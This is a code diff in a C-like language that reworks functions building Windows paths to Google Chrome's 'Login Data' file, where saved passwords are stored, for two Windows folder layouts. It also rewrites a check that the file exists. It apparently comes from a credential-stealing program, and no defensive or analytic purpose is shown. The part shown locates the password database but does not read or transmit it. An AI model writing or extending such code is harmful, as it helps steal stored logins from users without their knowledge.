@@ -18,22 +18,8 @@ int main()
         exit(1);
     }
     printf("%d", path_option);
+
     return 0;
-}
-
-string first_path(void)
-{
-    string drive, path, path2;
-    int search_result;
-
-    drive = Concat(getenv("HOMEDRIVE"), "/");
-    search_result = FindChar('\\',getenv("HOMEPATH"),1);
-    path = getenv("HOMEPATH");
-    path2 = SubString(path, search_result + 1, StringLength(path));
-    path = Concat(SubString(path, 1, search_result),"\b/");
-    path = Concat(Concat(drive, path), path2);
-    return Concat(path, "/Local Settings/Application Data/Google/Chrome/User Data/Default/Login Data" );
-
 }
 
 string second_path(void)
@@ -42,12 +28,27 @@ string second_path(void)
     int search_result;
 
     drive = Concat(getenv("HOMEDRIVE"), "/");
-    search_result = FindChar('\\',getenv("HOMEPATH"),1);
     path = getenv("HOMEPATH");
-    path2 = SubString(path, search_result + 1, StringLength(path));
-    path = Concat(SubString(path, 1, search_result),"\b/");
-    path = Concat(Concat(drive, path), path2);
-    return Concat(path, "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
+    search_result = FindChar('\\', path, 1);
+    path2 = SubString(path, search_result + 1, StringLength(path) - 1);
+    path = SubString(path, 1, search_result - 1);
+    path = Concat(path,Concat("/", path2));
+    return Concat(drive,Concat(path, "/Local Settings/Application Data/Google/Chrome/User Data/Default/Login Data"));
+
+}
+
+string first_path(void)
+{
+    string drive, path, path2;
+    int search_result;
+
+    drive = Concat(getenv("HOMEDRIVE"), "/");
+    path = getenv("HOMEPATH");
+    search_result = FindChar('\\', path, 1);
+    path2 = SubString(path, search_result + 1, StringLength(path) - 1);
+    path = SubString(path, 1, search_result - 1);
+    path = Concat(path,Concat("/", path2));
+    return Concat(drive,Concat(path, "/AppData/Local/Google/Chrome/User Data/Default/Login Data"));
 
 }
 
@@ -62,7 +63,9 @@ int find_chrome(void)
 
 short found_data(string path)
 {
-    if(fopen(path, "r") == NULL)
+    FILE *exist;
+    exist = fopen(path, "r");
+    if(exist == NULL)
         return 0;
     return 1;
 }
